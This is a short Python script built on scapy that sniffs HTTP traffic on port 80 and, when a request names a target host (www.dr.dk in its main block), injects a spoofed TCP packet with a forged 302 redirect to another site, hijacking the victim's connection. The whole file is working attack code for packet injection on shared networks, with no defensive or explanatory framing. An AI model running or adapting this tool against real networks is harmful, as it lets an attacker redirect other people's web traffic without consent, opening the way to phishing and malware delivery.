from scapy.all import *


class Redirector(AnsweringMachine):

    function_name = "http_redirector"
    filter = "tcp port {port}".format(port=80)

    def parse_options(self, target_host="www.google.com", redirect_url='http://math.fo/'):
        self.target_host = target_host
        self.redirect_url = redirect_url

    def is_request(self, req):
        return req.haslayer(Raw) and \
               (b" ".join([b"Host:", bytes(self.target_host, "utf-8")]) in req.getlayer(Raw).load)

    def make_reply(self, req):
        ip = req.getlayer(IP)
        tcp = req.getlayer(TCP)
        http_payload = b"".join([b"HTTP/1.1 302 Found\r\nLocation:",
                                 bytes(self.redirect_url, "utf-8"),
                                 b"\r\nContent-Length: 0\r\n",
                                 b"Connection: close\r\n\r\n"])

        resp = IP(dst=ip.src, src=ip.dst) / \
               TCP(dport=ip.sport, sport=ip.dport, flags="PA", seq=tcp.ack, ack=tcp.seq+len(tcp.payload)) / \
            Raw(load=http_payload)

        return resp


if __name__ == '__main__':
    conf.L3socket = L3RawSocket
    Redirector()(target_host="www.dr.dk", redirect_url="http://math.fo")
